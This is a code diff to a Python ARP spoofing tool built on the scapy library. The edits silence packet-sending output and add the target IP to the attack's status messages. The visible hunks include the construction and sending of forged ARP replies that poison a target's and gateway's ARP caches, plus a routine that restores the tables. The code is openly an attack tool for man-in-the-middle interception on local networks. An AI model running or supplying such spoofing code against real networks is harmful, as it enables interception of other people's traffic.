@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 import time
-from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr, get_if_addr, send
+from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr, get_if_addr
 import sys
 # import netifaces
 
@@ -36,7 +36,7 @@ class ARPSpoofer:
                                                                    pdst=target_ip, 
                                                                    hwdst=target_mac,
                                                                    psrc=spoof_ip)
-        sendp(packet, iface=self.interface)
+        sendp(packet, iface=self.interface, verbose=0)
 
     def restore(self, destination_ip, source_ip):
         '''
@@ -46,11 +46,11 @@ class ARPSpoofer:
         source_mac = self.get_mac(source_ip)
         packet = Ether(dst=destination_mac, src=source_mac) / ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                     psrc=source_ip, hwsrc=source_mac)
-        sendp(packet, iface=self.interface, count=4)
+        sendp(packet, iface=self.interface, count=4, verbose=0)
 
     def start(self):
         self.spoofing = True
-        print(f"[*] Starting ARP spoofing attack...")
+        print(f"[*] Starting ARP spoofing attack to {self.target_ip}...")
         print(f"[*] Target: {self.target_ip}")
         print(f"[*] Gateway: {self.gateway_ip}")
         
@@ -65,7 +65,7 @@ class ARPSpoofer:
             self.stop()
 
     def stop(self):
-        print("\n[*] Stopping ARP spoofing attack...")
+        print(f"\n[*] Stopping ARP spoofing attack to {self.target_ip}...")
         self.spoofing = False
         # Restore ARP tables
         self.restore(self.target_ip, self.gateway_ip)
